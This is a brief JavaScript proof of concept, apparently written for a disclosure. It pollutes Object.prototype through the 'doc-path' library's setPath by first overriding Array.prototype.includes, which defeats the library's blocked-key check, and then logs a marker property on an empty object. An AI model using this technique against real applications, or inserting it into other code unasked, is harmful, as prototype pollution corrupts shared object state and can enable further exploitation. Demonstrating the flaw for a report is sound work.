Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
const path = require('doc-path');
let obj = {};
console.log({}.polluted);
path.setPath({}, '__proto__.polluted', 'yes');
console.log({}.polluted);